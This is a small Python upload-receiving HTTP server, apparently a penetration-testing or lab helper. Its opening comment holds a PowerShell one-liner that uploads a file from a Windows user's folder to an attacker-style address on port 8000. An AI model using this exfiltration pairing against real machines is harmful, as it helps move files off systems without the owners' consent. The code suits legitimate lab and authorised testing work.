#!/usr/bin/env python3
# powershell upload file example:
# (New-Object Net.WebClient).UploadFile("http://10.10.14.41:8000/", "C:\Users\melanie\Documents\winPEAS.exe")
from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi, os
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers.get('content-type', ''))
        if ctype == 'multipart/form-data':
            fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
            for f in fs.list or []:
                if f.filename:
                    name = os.path.basename(f.filename)
                    open(name, 'wb').write(f.file.read())
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')
                    print('RECV', name)
                    return
        self.send_response(400)
        self.end_headers()
if __name__ == '__main__':
    HTTPServer(('0.0.0.0', 8000), H).serve_forever()
